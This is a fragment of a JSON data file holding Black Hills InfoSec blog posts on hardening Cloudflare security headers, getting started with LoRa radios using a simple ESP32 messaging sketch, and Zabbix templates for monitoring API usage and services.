https://content-security-policy.com/\n\nAnother good resource, perhaps a bit more technical, is the Content-Security-Policy Resource. This is an update to date compilation of current CSP mechanics and support matrix by browser.\n\nCloudflare HSTS Settings\n\nAfter you have set up your worker and configured your CSP according to your website\u2019s needs, there are a handful of other settings in Cloudflare that will also need configuration to fully align your website with secure practices (and get that better score on SecurityHeaders.io).\n\nBe aware however, that if your website or subdomains of your website are not also aligned according to these changes, you may experience a headache getting everything setup. Of note, once HTTP Strict Transport Security (HSTS) is enabled, there is no easy way to back out of configuration. Ensure that subdomains of your domain and your TLD website are configured with HTTPS appropriately before continuing.\n\nOn your Cloudflare Dashboard, jump to your domain and go to the SSL/TLS section and then the Edge Certificate\u2019s tab. You will find two sections that you should configure.\n\nAlways Use HTTPS\n\n\u201cAlways Use HTTPS\u201d will automatically redirect port 80 from Cloudflare\u2019s edge to HTTPS (443) for your website, regardless of if your origin server supports port 80 or serves other content from port 80.\n\nHTTP Strict Transport Security (HSTS)\n\nEnable HSTS and configure settings according to your need. It\u2019s best practice to have the max-age header set to at least 6 months, but this setting carries with it some risk. Once enabled, you must always support HTTPS on your site, or a possibility exists that users will not be able to access your website.\n\nMinimum TLS Version\n\nUnless your users are likely to be using unsupported or obsolete web browsers or clients, it is typically safe to enable a minimum TLS version of 1.2.\n\nVersions 1.1, 1.0, and SSL version 2 and version 3 are considered insecure by most security analysts despite a low threat probability.\n\nEnable TLS 1.3\n\nIt\u2019s the new rage, for this year. Enable this option to support TLS 1.3 on the Cloudflare Edge for your web server.\n\nPost-Change Testing\n\nAfter you have deployed the Cloudflare Worker and updated your Cloudflare Edge SSL/TLS options, it\u2019s time to check out if you\u2019ve made any impact on your \u201cSecurity Headers\u201d score. Let\u2019s use SecurityHeaders.io again to see if there has been improvement.\n\nMore Work \u2014 CSP Refinement\n\nWe\u2019re capped at an \u201cA\u201d because the website we host includes an \u201cunsafe-inline\u201d option in the Content-Security-Policy. Ultimately, you want to get rid of those, but it can be used as a stopgap to make your website function as you continue to build a more restrictive CSP. It\u2019s important to note that at the end of the day, effectively every resource source used on a website should be explicitly listed within the CSP. \u201cUnsafe\u201d source inclusions are\u2026 \u201cunsafe\u201dish.\n\nAssisted Configuration \u2014 CSP-as-a-Service\n\nThere are some new products out that will assist you in determining your baseline Content-Security-Policy based on your existing website resources used. There is a new CSP method, \u201creport-uri,\u201d that instructs web browsers to report CSP violations to a webservice that then notifies web administrators of the issue. This is something akin to how DMARC reporting works, allowing a domain owner to receive reports of potentially fraudulent email, except in this case the alert is about CSP violations.\n\nA handful of Content-Security-Policy report Service-as-a-Service products exist. They are configured to be the recipient of your users\u2019 browser\u2019s CSP violation reports. They aggregate the reports and then provide you with an appropriate updated baseline Content-Security-Policy.\n\nFrankly, this is something that you can do yourself without the use of a product. Load your webpage and check the Developer-Tools console for CSP violations. Regardless, a third-party service could go a long way in automating some of the monotony, especially for very large or complex websites where manually confirming the entirety of the website rending and functioning appropriately is not possible.\n\nContent-Security-Policy -As-A-Service Providers:\n\nNot a sponsor. Mileage and costs may vary.\n\nhttps://csper.io/\n\nhttps://go.talasecurity.io/content-security-policy\n\nhttps://github.com/kravietz/cspbuilder\n\nResources:\n\nCloudflare Workers: https://workers.cloudflare.com/\n\nTemplate Worker: https://github.com/Relkci/cf-worker-header-injector/blob/main/worker.js\n\nSecurityHeaders.io: https://www.securityheaders.io\n\nContent-Security-Policy Reference: https://content-security-policy.com/\n\nOWASP Security Header Project: https://owasp.org/www-project-secure-headers/\n\nFix Missing Security Headers on Web server: https://www.blackhillsinfosec.com/fix-missing-content-security-policy-website/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Introducing LoRa (Long Range) Wireless Technology - Part 1\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, Wireless\"\nCreation Date: \"Wed, 08 Dec 2021 20:20:20 +0000\"\nRay Felch //\n\nThis write-up is the first of a multi-part series, providing an introduction to LoRa wireless technology and the LoRaWAN, low-power wide-area network (LPWAN). Interestingly, I came across this technology while researching a GPS tracking project that I was working on and quickly determined that this technology might be a viable alternative to using the GPS module. The deeper my research into LoRa went, I found the technology and the concept of sensor networks to be fascinating. From what I can tell from my initial research, LoRa appears to be a fairly new technology (less than 6 years) but is based upon CSS (chirp spread spectrum) and is similar to the spread spectrum (frequency hopping) techniques used in CDMA and other GSM protocols, which is not new at all.\n\nThe general outline of this part of the series will begin with an introduction to LoRa and LoRaWAN, highlighting the special use cases and including a working demonstration of a point-to-point (line of sight) communication between two REYAX LoRa modules. Continuing on, this series will proceed with introducing The Things Network (TTN) and how to build your own private LoRa Gateway for connecting to it. LoRaWAN comprises both a commercial and community facet. The Things Network is partnered with the LoRaAlliance and provides a community edition (free) access to the LoRaWAN. This series will finish up by demonstrating how to interface your own end node (sensor) devices (via your personal gateway) to TTN and its server-side applications.\n\nGeneral Information\n\nWith the increasing surge of IoT (Internet of Things) reaching billions of devices worldwide, the demands being placed on the community of wireless technology developers and maintainers have also increased significantly. Other wireless technologies such as WiFi, Bluetooth Classic, Bluetooth Low Energy, Zigbee, Zwave, etc., all play a significant role in providing support for the many use-cases of IoT devices currently in circulation. Each of these technologies can adequately address the specific needs of an IoT device, such as transferring high volumes of data, streaming video and audio, automation and monitoring, wearables (fitness and health), short-range communications, medical, automotive, and agriculture industries, and asset tracking, just to name a few.\n\nAlthough these various wireless technologies fill an important need in regard to providing robust features and functionality for our IoT devices, each has its own inherent limitations. Generally speaking, in terms of wireless communication, the limitations become obvious when comparing available bandwidth (data rate) versus desired range. For example, based on the diagram below, we can see that a Bluetooth Classic headset might have a maximum range of approximately 50m, with a data rate of just a few Mbps. This makes it ideal for delivering a reasonably sized payload of audio; however, the bandwidth would not be sufficient to support streaming video. Notice that WiFi and Cellular technologies support a much higher data rate (due to the higher bandwidth available) and can easily support streaming video and high internet traffic, but at a cost of high power (and in the case of WiFi, at an additional cost of signal range).\n\nLink-Budget\n\nThe trade-offs between the various wireless technologies are often expressed in terms of 'link-budget,\u2019 which basically means the total cost to get a signal 'linked' from point-A to point-B (calculated in dBm). In reality, the formulas and calculations used by engineers to determine link-budgets are quite complex and take many things into consideration besides simply bandwidth versus range. Geographical locations, operating environment and buildings can obstruct and/or reflect RF (radio frequency) signals introducing loss in signal strength. Amplifier gain, antenna gain, impedance mismatches between cabling and antenna (resulting in high SWR), all have an effect on signal strength and receiver sensitivity. Ultimately, there are many factors that can affect the overall link-budget.\n\nReferring to the same diagram, we see that LoRa has an extremely low link-budget (low cost to deliver signal), especially considering the higher distances (range) that it can achieve. This makes it an ideal choice for communicating with extremely low power IoT end devices where battery life is paramount. This is all made possible by keeping the data payloads as small as possible, which is typically the case with sensor-type endpoint devices.\n\nIntroducing LoRa\n\nLoRa is a Low Power, Long Range wireless technology, focused on providing extremely low power (years on a single coin battery) and long range (10 miles line-of-site) solutions while working with IoT devices that typically generate very small data payloads (packets), such as humidity, temperature and moisture sensors, actuators, or water and gas meter monitoring.\n\nLoRa operates in the license-free ISM (Industrial, Scientific, and Medical purposed) sub-gigahertz band and is ideal for implementing low power, wide area (LPWAN) sensor networks.\n\nLoRa is a proprietary low-power wide-area network modulation technique, developed by Cycleo of Grenoble, France and acquired by Semtech (founding member of the patented LoRaAlliance). It is based on spread-spectrum modulation techniques derived from chirp spread spectrum (CSS) technology. The allocated radio frequencies consist of EU 433 (433.05-434.79 MHz) and EU 863-870 (863-870/873 MHz) in Europe; AU915-928/AS923-1 (915-928 MHz) in Australia; US 902-928 (902-928 MHz) in North America; IN 865-867 (865-867 MHz) in India; AU 915-928/AS 923-1 and EU433 Southeast Asia.[4]; and 2.4GHz worldwide. Be careful to check that the transceiver frequency matches the band for your region when purchasing LoRa radio modules.\n\nIntroducing LoRa Alliance and LoRaWAN\n\nThe LoRa Alliance is comprised of more than 500 members, including technology leaders like IBM, Cisco, and HP, as well as leading product companies such as Schneider, Bosch, Diehl, and Mueller. The goal of the alliance is to standardize a strong and growing ecosystem for the high-volume deployment of low power Internet of Things wide-area networks (LPWAN). Their ambitious goals entail being able to connect 50% of the predicted IoT volumes. They currently have 163 network operators in 177 countries.\n\nAccording to the Alliance, \"Network operators agree that they can only connect 10-15% of the predicted volume of IoT devices with classic (licensed bands) cellular technologies. WiFi and BT Smart serve some applications well, but clearly you are not going to connect moisture sensors for agriculture with WiFi. LPWA (low-power wide-area), with the inherent long range and low power characteristics will be the \u2018go-to\u2019 technology for IoT applications where remote locations, easy deployment, thousands of connections per gateway, and long battery life are required.\"\n\nWhile LoRa defines the physical (radio) layer, the application and media access control (MAC) layers (LoRaWAN) specification is defined by the LoRa Alliance and acts as a networking layer protocol, which manages communications between its gateways and end nodes (IoT devices).\n\nAs stated by the LoRa Alliance, \"The LoRaWAN\u00ae specification is a Low Power, Wide Area (LPWA) networking protocol designed to wirelessly connect battery operated \u2018things\u2019 to the internet in regional, national, or global networks, and targets key Internet of Things (IoT) requirements such as bi-directional communication, end-to-end security, mobility and localization services.\"\n\nOTA Duty Cycle\n\nNote: The 'over-the-air' duty cycle of radio devices is often regulated by the government and is commonly set to 1%.\n\nLikewise, the LoRaWAN specification dictates duty cycles for the join frequencies, the frequencies devices of all LoRaWAN-compliant networks use for over-the-air activations (OTAA) of devices. In most regions, this duty cycle is also set to 1%.\n\nAdditionally, The Things Network (community edition) has adopted a Fair Use Policy.\n\nAt first, these restrictions might seem to be a bit constraining, but in the use-case of low-power sensor node networks, this can work in our favor. Andreas Spiess described it best in his tutorial \"LoRa / LoRaWAN De-Mystified\" (see link at the end of this write-up).\n\nBased on the fact that our gateway concentrator has 8 RF channels, that means it can support up to 8 IoT devices in parallel. Realizing that 8 devices is small in comparison to the projected goals of hundreds of nodes per gateway, we could use these same 8 devices for 50% of the time and thereby increase our network of sensors by an additional 8 devices. Following that same concept, if we were to limit each device to operate for only 1% of the time, we can now support 800 nodes on our network on a single gateway, which, by the way, is also in compliance with the governing laws.\n\nSecurity Keys:\n\nLoRaWAN 1.0 specifies a few security keys: NwkSKey, AppSKey, and AppKey. All keys are 128 bits in length and using the AES-128 algorithm allows for the encrypting/decrypting of payloads, similar to the algorithm used in the 802.15.4 standard.\n\nWhen joining a new endpoint device to the network, the device is first registered to an application (created by the account holder of the gateway). When a device is registered (joined), it is assigned an APPEUI, DEVEUI, and APPKEY all unique to the device. When activating the device for deployment on the network, the NwkSkey and AppSKey (session keys) are created using the mutually known AppKey.\n\nThe NwkSKey is shared with the network, and the AppSKey is kept private. As the name implies, the session keys are used for the duration of the current session and are regenerated on every subsequent over-the-air-activation (OTAA) session.\n\nNote: Legacy versions of the LoRaWAN specification allowed for static activation of devices using Activation by Personalization (ABP). If ABP was used for activation, the same session keys are used for all sessions, unless manually changed by the account holder. Going forward with version 3.0 (The Things Stack), OTAA appears to be the preferred and more secure method of activation.\n\nNetwork Session Key (NwkSKey)\n\nInteraction between the endpoint (node) and the LoRaWAN server uses the NwkSKey to validate the integrity of each message with Message Integrity Code (MIC) in the same manner used in the 802.15.4 standard. The MIC (LoRaWAN uses AES-CMAC) prevents tampering with the message.\n\nApplication Session Key (AppSKey)\n\nThe AppSKey is used for the encryption and decryption of the payload. The payload is encrypted between the endpoint (node) and the Handler/Application Server protecting the messages sent and received from being read OTA.\n\nApplication Key (AppKey)\n\nThe AppKey is known only by the device and the application and, as stated above, is used for generating the two session keys.\n\nNote: The Things Network (TTN) also allows us to use a default AppKey or customize our own.\n\nFrame Counters\n\nAs with any wireless communication protocol, over-the-air captures of the radio signal is entirely possible, and with devices as cheap as $25. Fortunately for us, our data is encrypted using the AppSKey, and the network traffic is protected from tampering using the MIC (message integrity code) check. Frame Counter implementation was introduced in the 802.15 standard to help prevent replay attacks, where signals are captured and re-transmitted to spoof the original device.\n\nWhen a device is activated, the frame counters (FCntUp) and (FCntDown) are set to zero. Simply put, when a message uplink occurs, the FCntUp is incremented and likewise, when a message downlink occurs the FCntDown is incremented. If either the device or network sees a frame counter less than the last seen frame counter, the entire message is dropped (ignored), thereby preventing MitM (man in the middle) attacks.\n\nIntroducing The Things Network \n\nThe Things Stack is version 3 of an enterprise-grade LoRaWAN network server, built on an open-source core. The Things Stack allows us to build and manage LoRaWAN networks on our own hardware, as well as in the cloud.\n\nThe Things Stack is deployed for a variety of commercial deployment scenarios; however, they also provide a Community Edition deployment, which offers a 'free-to-use' network server that provides the world\u2019s largest community-based LoRaWAN network. To get connected with this free crowd-sourced, open, and decentralized LoRaWAN network, users need to sign-up for an account with TTN and either purchase or build their own gateway to connect to the network. I opted to build my own gateway using a Raspberry Pi-4 and RAK2243 Pi-HAT, and I will share this information later in the series.\n\nThe Things Network is based upon an open-source project that is dedicated to building a network for IoT devices based upon a protocol that allows these devices to connect to the internet without WiFi or cellular connectivity. The basic concept is centered upon endpoint (sensor) device transmissions being heard by a 'within-range' gateway, which then connects to the LPWAN.Later in this series, I intend on providing a step-by-step guide to building your own personal LoRaWAN gateway for under $100 and demonstrate how to connect your DIY home-built (or store-bought) sensors to The Things Network using LoRaWAN via your gateway.\n\nSimple LoRa Communication Demonstration\n\nThe following demonstration is based on an excellent example presented by akarsh98 of CETech (see link at the end of this write-up).\n\nHardware\n\n(2) ESP32 microcontroller modules amazon.com/ESP-WROOM-32-Development-Microcontroller-Integrated-Compatible/dp/B08D5ZD528/\n\n(2) REYAX RYLR890 LoRa Radio Modules amazon.com/RYLR896-Module-SX1276-Antenna-Command/dp/B07NB3BK5H/\n\nDupont jumper wires  amazon.com/s?k=Jumper+Wire+Dupont&ref=nb_sb_noss_2\n\nThese radio modules can be interfaced using any micro-controller, as we will be using a standard UART (TX/RX) connection to communicate with the onboard STM32 microcontroller chip. Previously, I interfaced to the STM32 chip using an Arduino Uno development board and a small sketch, but for this demonstration, I will be using an ESP32 device. These are amazing inexpensive micro-controllers with built-in WiFi and Bluetooth compatibility out-of-the-box.\n\nNote: Typically, sensor endpoints would not need the WiFi/Bluetooth capability of an ESP32 and would not be used in the wild, as those are high-power consumption features and defeat the intended goal of low power and long battery life. However, for the purpose of demonstrating LoRa wireless communication, the ESP32 provides us with a quick and simple setup (4 wires) and requires no soldering.\n\nAs stated earlier, our LoRa example is based upon a project by akarsh98 of CETech, which uses two ESP8266 (forerunner to the newer ESP32) and two REYAX RYLR890 LoRa Modules. Note, that I modified his code to support the newer ESP32 UARTS. The ESP32 has three hardware UARTs on-board, so the developers felt there was no longer a need to support the SoftwareSerial libraries used with the ESP8266.\n\nThe wiring is quite simple, Vcc and Gnd from the LoRa module goes to Vcc and Gnd on the ESP32 device. Tx from the LoRa module goes to GPIO-16 (RX2 pin) of the ESP32 and the Rx from the LoRa module goes to GPIO-17 (TX2 pin) of the ESP32.\n\nThe fact that the LoRa module contains an on-board STM32 microcontroller, allows us to communicate to the LoRa radio module using a special set of AT commands. Our ESP32 device will communicate these commands directly to the STM32 over serial UART. The STM32 microcontroller, acting on our AT commands, will control the LoRa radio module for us. Later in the series, we will see how to control other LoRa radios directly, using our code and special open-source LoRa libraries.\n\nLoRa Module AT Commands\n\nAs stated earlier, we will be sending special AT commands to control the LoRa radio. There are many AT commands available to us (link provided at the end of this write-up), but we will be using a few of the basic commands to get us up and running quickly. Generally, the AT commands fall into one of two groups: configuration and operational.\n\nConfiguration AT Commands\n\nFirst, we need to configure the radio module:\n\nAT+MODE (0 = Transmit and Receive mode (default), 1 = Places radio in sleep mode)\n\nAT+ IPR (300 - 115200 [default is 115200])\n\nAT+ PARAMETER , , , (see below)\n\nAT+BAND= (868500000 = Europe, 915000000 = US [default is US])\n\nAT+ADDRESS= (0 = 65535 [default is 0])\n\nSpreading Factor: (7 - 12 ([default is 12])\n\nBandwidth: (0 - 9 [default is 7 = 125 kHz])\n\nCoding Rate: (1 - 4 [default is 1])\n\nProgrammed Preamble: (4 - 7 [default is 4])\n\nSpreading Factor and Bandwidth are two of the most important parameters with regard to LoRa low-power and range considerations. The higher the spreading factor, the greater the over-the-air (OTA) time, resulting in more power and better range, but at a cost of reduced data rate. This is where LoRa can be flexible with regard to configuring for range or for low-power operation. Admittedly, it took me a bit of time before I finally sorted this all out, so I'll try and explain it with an example.\n\nFirst, the data rate depends on the bandwidth used and spreading factor. LoRaWAN can use channels with a bandwidth of either 125 kHz, 250 kHz, or 500 kHz (depending on the region or the frequency plan). The spreading factor is chosen (and set) by the end device (sensor) and influences the time it takes to transmit a frame.\n\nIncreasing the bandwidth or decreasing the spreading factor allow the bytes to be sent in a shorter period of time. The general rule is, doubling the bandwidth allows us to send twice the data payload in the same amount of time. Likewise, decreasing the spreading factor by one also allows us to send twice the data payload in the same amount of time.\n\nKeep in mind that lowering the spreading factor can also make it more difficult for the gateway to receive the transmitted signal, due to it being more susceptible to noise. If the gateway is a great distance away, you might use a higher spreading factor (SF10) (data rate will be slower, but more reliable). If the gateway is in close proximity, we can afford to use a lower spreading factor (SF7) and increase our data rate. Obviously, keeping our data payloads as small as possible contributes to overall data rate, range, and power consumption.\n\nOperational AT Commands\n\nAfter configuring the radio, we are ready to begin transmitting and receiving, which can be accomplished with the following commands:\n\nNote: The address of each LoRa Module (Transmitter and Receiver) must be identical in order to communicate with each other.\n\nTransmitting\n\nAT+SEND=, ,  (Address = 0 - 65535, Payload Length = Max 240 bytes, Data = ASCII format)\n\nReceiving\n\n+RCV =, ,,, (same as SEND with two additional parameters)\n\nRSSI (Received Signal Strength Indicator) is Received Signal Strength Indicator measured in dB and SNR is the Signal-to-Noise-Ratio measured in dB\n\nNote: 'AT' is not required for Receiving, because we are simply receiving data (not actually issuing a radio command).\n\nUpload the code (assumes Arduino IDE is installed and operational)\n\nConnect an ESP32 to a USB port on the PC\n\nEnter the Arduino IDE and under tools, select ESP32 Dev Module board and USB port\n\nUpload the code (sketch) to the ESP32\n\nDisconnect the ESP32 and connect the second ESP32. Follow the same steps for the second ESP32.LoRa Radio Messenger sketch (copy and paste as a new sketch for both ESP32 devices)\n\n/* LoRa transmitter - receiver messenger -- llcoder 11-18-2021\n* There are three serial ports on the ESP known as U0UXD, U1UXD and U2UXD.\n*\n* U0UXD is used to communicate with the ESP32 for programming and during reset/boot.\n* U1UXD is unused and can be used for your projects. Some boards use this port for SPI Flash access though\n* U2UXD is unused and can be used for your projects.\n*/\n\n#define RXD2 16 // LoRa TX (ESP32 RX2)\n#define TXD2 17 // LoRa RX (ESP32 TX2)\n\n#include\n\nString incomingString;\nString PrStr; // String used to print the incoming string after decoding it\n\nvoid setup() {\n Serial.begin(115200);\n Serial2.begin(115200, SERIAL_8N1, RXD2, TXD2); // (ESP32 UART)\n}\n\nvoid loop() {\n if (Serial.available()){\n incomingString = Serial.readString();\n if(incomingString.length()>2){\n Serial.print(\"YOU: \");\n Serial.println(incomingString);\n String messStr = \"AT+SEND=0,\"; // messStr(AT COMMAND) is to be sent to the LoRa module to send the relevant data\n messStr += (incomingString.length()-2);\n messStr += \",\";\n messStr += incomingString;\n Serial2.print(messStr);\n }\n }\n\n else if (Serial2.available()){ // this will read the incoming data from the lora and decode it and print it on serial monitor\n incomingString = Serial2.readString();\n String recTest = incomingString.substring(1,4);\n if(recTest == \"RCV\"){\n String messagesize;\n int addr_start = incomingString.indexOf(',');\n int addr_mid = incomingString.indexOf(',', addr_start + 1);\n messagesize = incomingString.substring(addr_start + 1, addr_mid);\n PrStr = incomingString.substring(addr_mid + 1, (addr_mid + 1 + messagesize.toInt()));\n Serial.print(\"THEM: \");\n Serial.println(PrStr);\n }\n }\n}\n\nSample Output\n\nBoth ESP32 devices have been programmed with the same code and are capable of transmitting as well as receiving. For this demonstration, one ESP32 is connected to a laptop via USB, and the second ESP32 is connected to a mobile phone via OTG-USB. Serial terminals have been opened on both devices and are in receive mode, monitoring for LoRa radio signals. If the signal received does not specify the correct address in its header, the message is dropped (ignored). Otherwise, it is accepted and displayed in both terminals.\n\nThe following screenshot shows a typical back and forth message sequence:\n\nTest Results\n\nTesting was done to determine the approximate range for reliable two-way communication. In my location (urban area with buildings, trees, and hills), the line-of-site is somewhat limited.  With myself stationed at the laptop (indoors), a family member completed a trek outside with the phone and we both closely monitored our two-way communication.\n\nBased upon this preliminary run, I determined the range to be approximately 150 meters. Obviously, with one of the radios being indoors where the signal is obstructed by the structure, it is likely that this contributed to a significantly reduced range. For this reason, we conducted another test on an urban stretch of road, line-of-site and less obstructed by buildings, trees, or hills. In this case, we found that our range had increased, to approximately 700 meters (0.5 miles), but still well below the 13km claimed by Semtech and others.\n\nTaking into account that our radio modules are presently attached to the microcontroller using push-on cabling, rather than soldered, and are being powered via USB OTG adapters, rather than dedicated power banks, a more definitive test may be in order, preferably conducted in a more rural and less populated area.\n\nSummary:\n\nAlthough LoRa wireless and LoraWAN appear to be tightly coupled to a specific use-case of IoT technology (extremely small data payload devices, sensors, activators, etc.), there is an obvious need for this new wireless technology, if for no other reason than to off-load the already heavily taxed traffic of existing Bluetooth and Wifi IoT devices.\n\nMore so, in an agricultural environment, where the range of coverage could be in the order of miles, Bluetooth and WiFi fall seriously short. Likewise, with a deployment of hundreds (if not thousands) of sensors to a wide area, battery maintenance becomes an important concern and battery changes need to be held to a minimum.\n\nWith LoRa wireless technology, sensors have been verified to last years on a single button cell battery, and under ideal rural conditions reach line-of-site ranges of 13km (10 miles) or ideal urban conditions of 5km (3 miles). As a side note, researchers have proposed that LoRaWAN could solve some of the issues regarding the power demands of 4G/5G technologies.\n\nLoRa Wiki states that chirp spread spectrum may also be used in the future for military applications, as it is very difficult to detect and intercept when operating at low power. Fun fact: CHIRP of (CSS) is yet another acronym that stands for Compressed High Intensity Radar Pulse.\n\nAt the time of this writing, LoRa and LoRaWAN are still in their infant stage (approximately 5 years old) but are rapidly gaining momentum. Personally, I am pretty amazed with the entire concept of IoT Low-Power Wide Area Networks, and how the community is quickly adopting and getting involved with this new wireless technology. So much so that I have recently built my own personal LoRa gateway which is connected to The Things Network, and I am currently developing experimental sensor nodes that send humidity and temperature payloads to the LPWAN. Part Two of this series, I will go on to describe how to build your own personal LoRa Gateway for under $100 using a Raspberry-Pi and RAK2243 Pi-HAT, and how to connect it to The Network of Things. Additionally, this series would not be complete if I did not demonstrate how to create an application and register/activate a sensor node to the application. Once activated, we will be able to connect to the TTN web-based console and watch the live data as it is received via the gateway. Stay tuned.\n\nInformative Links:\n\nhttps://lora-developers.semtech.com/documentation/tech-papers-and-guides/lora-and-lorawan/  Semtech: DEVELOPER PORTAL\n\nhttps://www.youtube.com/watch?v=hMOwbNUpDQA  Andreas Spiess: #112 LoRa / LoRaWAN De-Mystified / Tutorial\n\nhttps://www.youtube.com/watch?v=jnvik7sUosw   CETech: LoRa based messenger Project| LoRaWAN | LoRa Basic Project\n\nhttps://play.google.com/store/apps/details?id=de.kai_morich.serial_usb_terminal&hl=en_IN  USB Serial Terminal (Mobile app)\n\nhttps://www.thethingsnetwork.org/  TTN The Things Network\n\nhttps://www.thethingsnetwork.org/docs/lorawan/security/  LoRaWAN Security Keys\n\nhttps://www.youtube.com/watch?v=dxYY097QNs0  Excellent video explaining the LoRa chirp\n\nhttps://www.youtube.com/watch?v=NoquBA7IMNc  Matt Knight, Bastille Networks: Decoding the LoRa PHY (33c3)\n\nhttp://reyax.com/wp-content/uploads/2020/01/Lora-AT-Command-RYLR40x_RYLR89x_EN.pdf  LoRa Module AT commands document\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Zabbix Templates for Security Analysts and Systems Administrators  EOY 2021\"\nTaxonomies: \"Author, Informational, InfoSec 101, Kent Ickler, Kent Ickler, Monitoring, Opsec\"\nCreation Date: \"Thu, 16 Dec 2021 20:08:24 +0000\"\nKent Ickler //\n\nBackground\n\nBHIS uses several tools for monitoring infrastructure. One of the most important tools for us that helps monitor systems health is Zabbix. It\u2019s been a while since I went about creating Zabbix (https://www.zabbix.com/) monitoring templates. Long story short, I took a backseat role to Systems Administration a couple years ago when we hired DRock and later Napalm-Nick to kick butt on our systems team while I transitioned the majority of my time to penetration testing. I helped out the Systems team occasionally throughout the year, including a rebuild of our Zabbix monitoring platform.\n\nThe new Zabbix version that had been released since our previous deployment had some bugfixes and new features, especially with how the system captures JSON type data. In the course of the last year, we\u2019ve deployed multiple new Zabbix instances. To help the Systems team monitor the difficult-to-monitor systems and services, I\u2019ve created a handful of Zabbix templates that help BHIS keep an eye on things while we\u2019re asleep or otherwise occupied with other projects. Not everyone will find these useful, but some of you may.\n\nOther security firms using the same API technologies to help us augment data will find some of the templates useful for monitoring API usage, credit allowances, etc.\n\nHere\u2019s a quick rundown of new templates we\u2019ve created as open-source and how you could use them in your own operations.\n\nInterface Bandwidth Aggregates - Bandwidth-vnstat\n\nLink: https://github.com/Relkci/Zabbix_Bandwidth-vnstat\n\nThis template uses the Linux tool, \u201cvnstat,\u201d to monitor traffic per interval, day, and month. Alerts can be configured on an interface if network bandwidth will breach certain configurable thresholds. Below are some sample graphs from the template and BHIS\u2019s own www.blackhillsinfosec.com webserver.\n\nFullContact API\n\nLink: https://github.com/Relkci/Zabbix_FullContact_API\n\nIt\u2019s not surprising that BHIS uses API service to augment their security research and penetration testing. FullContact (www.fullcontact.com) is a service that aggregates company user information and provides results in JSON format or via their website interface. BHIS created a Zabbix template to monitor the API credit allowance and usage of the FullContact platform.\n\nSendgrid Email Delivery\n\nLink: https://github.com/Relkci/Zabbix_Sendgrid_Api_Provider\n\nBHIS uses Sendgrid (www.sendgrid.com) for its delivery of some marketing-based emails. We also use it for things like alerting and some transactional-type emails. This Zabbix template monitors email-send credits, account information, spam reports, unsubscribe reports, IP reputation, and the like. Alerts are configured to let us know when we are short on credits or when administrative changes are made to the platform.\n\nHere\u2019s a screenshot of a sample graph showing the suppression over time:\n\nCensys.IO API Monitor\n\nLink: https://github.com/Relkci/Zabbix_Censys.io-API-Status\n\nMuch like FullContact, BHIS uses Censys.io to augment some of its data analysis. This Zabbix template monitors API usage and allowances and alerts us if our credits are approaching overages.\n\nWPScan API Monitor\n\nLink: https://github.com/Relkci/Zabbix_WPScanAPIStatus\n\nWPScan is a tool that can perform analysis of WordPress based websites. It can enumerate plugins, users, themes, and even find vulnerabilities. A service related to WPScan is www.wpscan.com that can execute these scans via an API request. This Zabbix template monitors the use of the wpscan.com API account and lets us know if we approach our API allowance.\n\nShodan.IO API Monitor\n\nLink: https://github.com/Relkci/Zabbix_Shodan-APIStatus\n\nShodan.io has been around for ages! Shodan is known for scanning the public internet and aggregating services it identifies. A service of Shodan.io allows organizations to monitor their own internet footprint, as well as do adhoc scans of the Shodan.io public internet database. This Zabbix template monitors the API usage of our Shodan.io account and lets us know if we\u2019re running out of credits.\n\nVirusTotal API Monitor\n\nLink: https://github.com/Relkci/Zabbix_VirusTotalAPIStatus\n\nThere is a wealth of hunter and malware information at VirusTotal that can assist both red and blue teams be efficient in malware creation, as well as threat hunting and Incident Response. This Zabbix template monitors the VirusTotal API usage across a multitude of VirusTotal\u2019s products. Alerts are configured to let us know if we are about to breach our API allowance and to let us know about account administrative changes.\n\nMailChimp Marketing Monitor\n\nLink: https://github.com/Relkci/Zabbix_MailChimpStats\n\nMuch like BHIS uses Sendgrid to send some transactional and marketing emails, we also use MailChimp for some of our more targeted emails to users that have subscribed to our mailing lists. This Zabbix template monitors campaign administration, email send statistics, bounce-backs, and account security. The Zabbix triggers alert us when they see a problem.\n\nHere\u2019s a couple of sample screenshots:\n\nAugmented Geolocation with IPStack\n\nLink: https://github.com/Relkci/Zabbix_GeoLocation-IPStack\n\nZabbix saves some information about a monitored host or service that can be used to augment information using other services. In this case, we use the public IP of a host with IPStack (www.ipstack.com) to augment geolocation data of the host itself. This allows us to then create groupings and aggregations of statistics based on the geographical locations of user servers, without having to worry about manually updating them. This template also monitors the IPStack account, API usage and lets us know if there are issues.\n\nHere\u2019s a couple of screenshots of the resulting augmented data:\n\nCloudflare Tunnel Metrics\n\nLink: https://github.com/Relkci/Zabbix_Cloudflared\n\nCloudflare has some incredible products. We use some. One of their products is Cloudflare Argo Tunnels. The service is probably going to be renamed soon, but in short, you can think of it as a reverse proxy. Anyway, this Zabbix template monitors our Cloudflare Tunnels and lets us know when things don\u2019t look healthy.\n\nHere\u2019s a few screenshots of this template:\n\nNessus Professional Monitor\n\nLink: https://github.com/Relkci/Zabbix_Nessus-Professional_Monitoring\n\nWe use a variety of vulnerability scanners at BHIS. Tenable\u2019s Nessus has been in the game for quite a while. This Zabbix template monitors the health of our Nessus deployments, as well as some operational and administrative information. An alert lets us know when problems are identified.\n\nHere are some screenshots:\n\nSecurity Scorecard\n\nLink: https://github.com/Relkci/Zabbix_SecurityScorecard\n\nLast, but not least, is a service that we got familiar with over the past year. I\u2019m not posting this as a product announcement for Security Scorecard. CJ and I have gone rounds about their service and how it can be pretty awesome for Third-Party Risk Management departments. That aside, BHIS created a small deployment within the Security Scorecard service to monitor some of our vendor\u2019s attention to security posture\u2026 or something. Let\u2019s just say we\u2019re undecided on how meaningful the data is. CJ already asked me for a webcast on this topic, so\u2026 someday. Anyway, this Zabbix template monitors the \u201cSecurity Scorecard\u201d grades and scores for your organizations, your vendors, and your competitors. The template will let you know when your score, or the percentage of your score compared to your competitors\u2019, changes. It can also let you know if your vendors\u2019 scores change.\n\nThese screenshots are pretty hard to snag without throwing out our vendors\u2019 and competitors\u2019 names (competitors are fine; we\u2019re like extended family). Anyhow, here\u2019s some of the generalized graphs:\n\nUsing Zabbix has allowed us to monitor several of our automated, operational, and administrative processes for both statistics and security oversight. We hope these templates might be of some use to you. To be alerted to future templates we build, subscribe notifications to this repository and you\u2019ll be notified when we make updates. https://github.com/Relkci/Zabbix-Templates\n\nReferences:\n\nZabbix Templates: https://github.com/Relkci/Zabbix-Templates\n\nZabbix: https://www.zabbix.com/\n\nFull Contact: 